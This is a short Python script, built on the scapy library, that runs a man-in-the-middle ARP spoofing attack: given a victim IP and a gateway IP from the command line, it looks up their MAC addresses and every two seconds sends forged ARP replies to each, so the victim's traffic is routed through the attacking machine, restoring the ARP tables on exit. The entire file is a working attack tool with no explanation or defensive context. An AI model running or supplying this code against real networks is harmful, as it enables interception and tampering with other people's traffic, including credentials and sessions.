import scapy.all as scapy
import argparse
import time

def spoofer(victimIP, victimMAC, gatewayIP):
    packet = scapy.ARP(op=2, pdst=victimIP, hwdst=victimMAC, psrc=gatewayIP)
    scapy.send(packet, verbose=False)

def restore(victimIP, victimMAC, gatewayIP, gatewayMAC):
    packet = scapy.ARP(op=2, pdst=victimIP, hwdst=victimMAC, psrc=gatewayIP, hwsrc=gatewayMAC)
    scapy.send(packet, count=4, verbose=False)

parser = argparse.ArgumentParser(description="Scapy MITM ARP Spoofer")
parser.add_argument("-v", "--victim", required=True, help="Victim IP address")
parser.add_argument("-g", "--gateway", required=True, help="Gateway IP address")

args = parser.parse_args()

victimIP = args.victim
gatewayIP = args.gateway
victimMAC = scapy.getmacbyip(victimIP)
gatewayMAC = scapy.getmacbyip(gatewayIP)

print(f"Victim IP: {victimIP}\n Victim MAC: {victimMAC}")
print(f"Gateway IP: {gatewayIP}\n Gateway MAC: {gatewayMAC}")

try:
    while True:
        spoofer(victimIP, victimMAC, gatewayIP)
        spoofer(gatewayIP, gatewayMAC, victimIP)
        time.sleep(2)
except KeyboardInterrupt:
    print("\nRestoring normal state...")
    restore(victimIP, victimMAC, gatewayIP, gatewayMAC)